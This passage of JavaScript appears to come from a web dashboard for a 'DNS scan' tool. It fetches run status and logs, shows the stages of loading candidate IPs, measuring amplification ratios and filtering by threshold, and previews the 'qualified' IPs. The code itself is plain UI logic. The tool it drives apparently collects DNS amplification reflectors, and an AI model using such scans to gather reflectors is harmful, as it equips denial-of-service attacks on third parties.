    container.innerHTML = items.map(([label, value]) => `
        <div class="tcp-run-meta-item">
            <span>${escapeHtml(String(label))}</span>
            <strong>${escapeHtml(String(value ?? "-"))}</strong>
        </div>
    `).join("");
}

async function loadDnsRunDetail(runId) {
    const dnsStopBtn = document.getElementById("dnsStopBtn");
    const dnsStartBtn = document.getElementById("dnsStartBtn");
    try {
        const resp = await fetch(`/api/dns-scan/runs/${runId}`);
        const data = await resp.json();
        if (!data.success) throw new Error(data.message || "Failed");

        const s = data.stats || {};
        const running = data.is_running;
        currentDnsSummary = data;

        setText("dnsStatus", getDnsStageStatusText(s.stage || "", running));
        setText("dnsRunId", runId);
        setText("dnsStage", (s.stage || "-").toUpperCase());
        setText("dnsProgress", `${s.tested || 0}/${s.total_tasks || s.total_ips || 0}`);
        renderDnsMeta(data);
        if (dnsStopBtn) dnsStopBtn.disabled = !running;
        if (dnsStartBtn) dnsStartBtn.disabled = running;

        // 阶段列表
        const stages = ["loading", "scanning", "filtering", "saving"];
        const stageLabels = ["加载候选 IP", "放大率测量", "按阈值筛选", "保存结果"];
        const stageList = document.getElementById("dnsStageList");
        if (stageList) {
            stageList.innerHTML = stages.map((stg, i) => {
                let state = "待开始";
                const idx = stages.indexOf(s.stage || "");
                if (idx > i) state = "已完成";
                else if (idx === i) state = running ? "进行中" : (s.stage === "done" ? "已完成" : (s.stage === "error" ? "失败" : "待开始"));
                return `<div class="tcp-stage-item"><span>${stageLabels[i]}</span><strong>${state}</strong></div>`;
            }).join("");
        }

        // 日志
        if (running) {
            try {
                const logResp = await fetch(`/api/dns-scan/runs/${runId}/logs?tail=200`);
                const logData = await logResp.json();
                if (logData.success) {
                    setText("dnsPipelineLog", logData.log || s.log_tail || "");
                } else {
                    setText("dnsPipelineLog", s.log_tail || "");
                }
            } catch (e) {
                setText("dnsPipelineLog", s.log_tail || "");
            }
        } else {
            setText("dnsPipelineLog", s.log_tail || "");
        }

        // 优质预览
        try {
            const resResp = await fetch(`/api/dns-scan/runs/${runId}/results`);
            const resData = await resResp.json();
            if (resData.success) {
                renderDnsQualifiedPreview(resData.qualified_ips || []);
            } else {
                renderDnsQualifiedPreview([]);
            }
        } catch (e) {
            renderDnsQualifiedPreview([]);
        }

        // 产物
        const artifacts = data.artifacts || [];
        document.getElementById("dnsArtifacts").innerHTML = artifacts.length
            ? artifacts.map((a) => `<button type="button" class="tcp-artifact-item tcp-file-button" data-dns-file-name="${escapeHtml(a.name)}"><span>${escapeHtml(a.name)}</span><strong>${formatBytes(a.size)}</strong></button>`).join("")
            : `<div class="info-text">暂无输出文件</div>`;
        document.querySelectorAll("[data-dns-file-name]").forEach((item) => {
            item.addEventListener("click", () => openDnsFileModal(item.getAttribute("data-dns-file-name")));
        });

        document.getElementById("dnsRuntimeError").textContent = data.runtime_error ? `失败原因：${data.runtime_error}` : "";
    } catch (e) {
        console.warn("DNS run detail load failed", e);
    }
}

// 加载 IP 文件列表 & 绑定按钮 (在 DOMContentLoaded 中调用)
function initDnsScanView() {
    bindDnsScanControls();
    loadDnsIpFiles();
}
